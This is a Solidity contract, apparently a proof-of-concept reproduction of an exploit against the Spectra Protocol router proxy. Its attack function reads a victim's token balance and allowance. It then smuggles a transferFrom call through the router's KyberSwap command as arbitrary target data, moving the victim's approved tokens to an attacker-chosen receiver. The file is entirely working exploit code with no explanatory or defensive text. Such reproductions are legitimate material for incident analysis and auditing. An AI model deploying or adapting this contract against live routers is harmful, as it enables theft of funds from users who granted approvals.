// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IRouter} from "../../src/SpectraProtocol/Router/interfaces/IRouter.sol";

contract AttackSpectraAMProxy {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function attack(
        address proxy,
        address token,
        address from,
        address receiver
    ) external {
        bytes memory _commands;
        _commands = hex"12";
        bytes[] memory _inputs = new bytes[](_commands.length);
        uint256 balance = IERC20(token).balanceOf(from);
        uint256 approve_amount = IERC20(token).allowance(from, proxy);
        bytes memory transferFrom_calldata = abi.encodeCall(
            IERC20.transferFrom,
            (
                from,
                receiver,
                balance > approve_amount ? approve_amount : balance
            )
        );
        // address kyberRouter,
        // address tokenIn,
        // uint256 amountIn,
        // address tokenOut,
        // uint256,
        // bytes memory targetData
        _inputs[0] = abi.encode(
            token,
            ETH,
            0,
            address(0),
            0,
            transferFrom_calldata
        );
        // implementation: 0x51BdbfCd7656e2C25Ad1BC8037F70572B7142eCC
        IRouter(proxy).execute(_commands, _inputs);
    }
}
